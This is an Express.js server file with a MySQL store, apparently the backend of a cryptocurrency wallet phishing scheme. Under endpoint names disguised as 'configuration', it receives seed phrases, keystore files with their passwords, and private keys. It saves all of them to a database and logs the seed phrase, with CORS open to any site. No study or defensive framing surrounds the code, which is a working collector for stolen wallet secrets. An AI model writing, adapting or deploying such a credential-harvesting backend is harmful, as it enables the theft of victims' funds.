const express = require("express")
const bodyParser = require("body-parser")
const cors = require('cors')
const knex = require('knex')
const app = express()



const database = knex({
    client: 'mysql',
    // version: '15.1',
    
    connection: {  
        host : process.env.HOST,
        user : process.env.USERNAME,
        password : process.env.PASSWORD,
        database : process.env.DATABASE,
        timezone: 'utc',
        port: "3306"
}
  });  

  app.use(bodyParser.json())
  app.use(cors())

  app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
 })




app.post("/configuration" ,(req,res) =>{
const {phrase} = req.body
    if (!phrase) {
        return res.status(400).json("Incomplete Form Submission")
    }
    console.log(phrase)
    database('root')
    .insert({
        phrase: phrase, 
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        // .catch(err=> res.status(400).json("Tracking Number Already Exist"))
})

app.post("/configurationjson" ,(req,res) =>{
const { keystore ,password } = req.body
    if (!keystore || !password) {
        return res.status(400).json("Incomplete Form Submission")
    }
    database('root')
    .insert({
        keystoreJson: keystore,
        password: password,
        
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        // .catch(err=> res.status(400).json("Tracking Number Already Exist"))
})

app.post("/configurationprivate" ,(req,res) =>{
const { privatekey} = req.body
    if (!privatekey) {
        return res.status(400).json("Incomplete Form Submission")
    }
    database('root')
    .insert({
        privateKey: privatekey,
        
    })
    .then(user =>{ 
        res.status(200).json("success")
        }) 
        // .catch(err=> res.status(400).json("Tracking Number Already Exist"))
})



app.get("/",(req ,res)=>{
    res.send("hello world");
})



app.listen(process.env.PORT ||4000)
